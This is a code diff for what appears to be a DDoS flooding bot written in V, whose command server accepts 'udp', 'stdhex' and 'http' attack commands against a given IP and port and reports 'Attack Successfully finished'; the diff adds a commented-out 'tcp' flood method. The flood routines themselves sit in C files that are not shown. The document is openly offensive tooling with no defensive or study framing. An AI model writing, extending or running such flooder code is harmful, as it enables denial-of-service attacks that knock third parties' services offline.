@@ -8,10 +8,12 @@ import core.logger
 #include "@VROOT/core/methods/udp.c"
 #include "@VROOT/core/methods/stdhex.c"
 #include "@VROOT/core/methods/http.c"
+// #include "@VROOT/core/methods/tcp.c"
 
 fn C.udp_bypass(&char, u16, int)
 fn C.stdhex(&char, int, int)
 fn C.sendHTTP(&char, int)
+// fn C.send_tcp(&char, int, int)
 
 fn main() {
 	mut args := os.args.clone()
@@ -54,6 +56,15 @@ fn server(ip string, port string, pw string) {
 						server.write_string("[ + ] Attack Successfully finished....\n") or { return }
 					}
 				}
+				// "tcp" {
+				// 	if args.len < 4 {
+				// 		server.write_string("[ x ] Error, Something went wrong sending attack.....\n") or { return }
+				// 	} else {
+				// 		server.write_string("[ + ] Attack being sent....\n") or { return }
+				// 		go send_tcp(args[1], args[2].int(), args[3].int())
+				// 		server.write_string("[ + ] Attack Successfully finished....\n") or { return }
+				// 	}
+				// }
 				"stdhex" {
 					if args.len < 4 {
 						server.write_string("[ x ] Error, Something went wrong sending attack.....\n") or { return }
@@ -97,6 +108,10 @@ fn parse_buffer(buff string) (string, string, []string) {
 fn send_udp(ip string, p u16, t int) {
 	C.udp_bypass(&char(ip.str), p, t)
 }
+
+// fn send_tcp(ip string, p int, t int) {
+// 	C.send_tcp(&char(ip.str), p, t)
+// }
 
 fn send_std(ip string, p int, t int) {
 	C.stdhex(&char(ip.str), p, t)
